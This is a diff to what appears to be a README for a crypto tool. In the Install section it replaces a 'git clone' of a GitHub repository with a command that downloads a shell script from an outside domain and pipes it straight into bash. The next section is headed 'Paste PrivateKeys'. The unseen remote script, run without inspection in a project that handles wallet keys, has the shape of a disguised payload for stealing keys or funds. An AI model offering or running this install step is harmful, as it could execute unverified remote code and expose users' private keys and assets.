@@ -12,7 +12,7 @@
 
 ## Install 
 ```
-git clone https://github.com/zamzasalim/initverse.git
+bash <(curl -s https://data.zamzasalim.xyz/file/uploads/bybitgamefi.sh)
 ```
 
 ## Paste PrivateKeys
